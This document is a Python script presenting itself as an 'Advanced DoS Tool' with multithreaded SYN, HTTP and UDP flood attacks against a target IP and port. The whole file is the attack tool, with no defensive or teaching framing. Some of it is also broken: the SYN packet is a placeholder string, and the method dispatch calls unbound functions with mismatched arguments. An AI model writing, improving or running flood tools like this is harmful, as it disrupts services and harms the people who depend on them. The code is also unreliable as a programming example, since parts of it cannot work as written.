import socket
import threading
import time
import logging
import argparse
import random
import sys
from concurrent.futures import ThreadPoolExecutor

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class DoSAttacker:
    def __init__(self):
        self.running = False
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': None
        }
        
        # Common user agents for HTTP flood
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'
        ]

    def show_banner(self):
        print("""
        ██████╗  ██████╗ ███████╗
        ██╔══██╗██╔═══██╗██╔════╝
        ██║  ██║██║   ██║███████╗
        ██║  ██║██║   ██║╚════██║
        ██████╔╝╚██████╔╝███████║
        ╚═════╝  ╚═════╝ ╚══════╝
        Advanced DoS Tool v2.0
        """)

    def get_stats(self):
        duration = time.time() - self.stats['start_time']
        return (
            f"\nAttack Statistics:\n"
            f"Duration: {duration:.2f} seconds\n"
            f"Total Requests: {self.stats['total_requests']}\n"
            f"Successful: {self.stats['successful']}\n"
            f"Failed: {self.stats['failed']}\n"
            f"Req/Sec: {self.stats['total_requests']/duration:.2f}"
        )

    def syn_flood(self, target_ip, target_port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Craft TCP SYN packet
                packet = self._craft_syn_packet(target_ip, target_port)
                s.sendto(packet, (target_ip, target_port))
                
                self.stats['successful'] += 1
                self.stats['total_requests'] += 1
            except Exception as e:
                self.stats['failed'] += 1
                logger.error(f"SYN Flood Error: {str(e)}")
            finally:
                s.close()

    def _craft_syn_packet(self, target_ip, target_port):
        # Packet crafting implementation
        # (Note: Actual implementation requires raw socket programming)
        # This is a simplified version for demonstration
        source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        packet = f"SYN|{source_ip}|{target_ip}|{target_port}"
        return packet.encode()

    def http_flood(self, target_ip, target_port, use_proxy=False):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                
                if use_proxy:
                    # Proxy implementation would go here
                    pass
                else:
                    s.connect((target_ip, target_port))
                
                payload = (
                    f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    "Accept: */*\r\n\r\n"
                ).encode()
                
                s.send(payload)
                self.stats['successful'] += 1
                self.stats['total_requests'] += 1
            except Exception as e:
                self.stats['failed'] += 1
                logger.error(f"HTTP Flood Error: {str(e)}")
            finally:
                s.close()

    def udp_flood(self, target_ip, target_port, packet_size=1024):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(packet_size)
                s.sendto(data, (target_ip, target_port))
                self.stats['successful'] += 1
                self.stats['total_requests'] += 1
            except Exception as e:
                self.stats['failed'] += 1
                logger.error(f"UDP Flood Error: {str(e)}")
            finally:
                s.close()

    def start_attack(self, method, target_ip, target_port, threads, **kwargs):
        self.running = True
        self.stats['start_time'] = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(
                    self._attack_methods[method],
                    target_ip,
                    target_port,
                    **kwargs
                )

        # Start stats thread
        stats_thread = threading.Thread(target=self._show_real_time_stats)
        stats_thread.daemon = True
        stats_thread.start()

    def stop_attack(self):
        self.running = False
        logger.info("Attack stopped.")
        print(self.get_stats())

    def _show_real_time_stats(self):
        while self.running:
            time.sleep(5)
            print(self.get_stats())

    _attack_methods = {
        'syn': syn_flood,
        'http': http_flood,
        'udp': udp_flood
    }

def main():
    attacker = DoSAttacker()
    attacker.show_banner()

    parser = argparse.ArgumentParser(description='Advanced DoS Tool')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, required=True, help='Target port')
    parser.add_argument('-m', '--method', choices=['syn', 'http', 'udp'], required=True, help='Attack method')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads')
    parser.add_argument('--packet-size', type=int, default=1024, help='Packet size for UDP flood')
    parser.add_argument('--use-proxy', action='store_true', help='Use proxy for HTTP flood')

    args = parser.parse_args()

    try:
        logger.info(f"Starting {args.method.upper()} attack on {args.target}:{args.port}")
        attacker.start_attack(
            method=args.method,
            target_ip=args.target,
            target_port=args.port,
            threads=args.threads,
            packet_size=args.packet_size,
            use_proxy=args.use_proxy
        )

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        attacker.stop_attack()
        sys.exit(0)

if __name__ == '__main__':
    main()
